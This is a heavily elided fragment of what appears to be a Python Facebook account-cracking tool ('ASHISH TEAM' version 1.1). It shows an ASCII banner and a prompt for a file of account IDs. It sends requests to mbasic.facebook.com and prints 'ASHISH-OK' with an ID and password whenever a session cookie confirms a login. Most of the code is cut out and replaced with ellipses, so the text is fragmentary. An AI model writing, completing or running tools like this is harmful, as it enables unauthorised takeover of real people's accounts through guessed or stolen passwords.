...
logo=("""\033[1;97m
  ...
  ______    ______   __    __  ______   ______   __    __         __    __  _______  
...
def fia():    
			...
			print('\x1b[1;91m>>> ASHISH TEAM  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				print('Example : /sdcard/ASHISH-XD.txt')
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
			...
			if 'c_user' in log_cookies:
				...
				print('\33[38;5;208m[ASHISH-OK] '+cid+' | '+ps+'\033[1;32m')
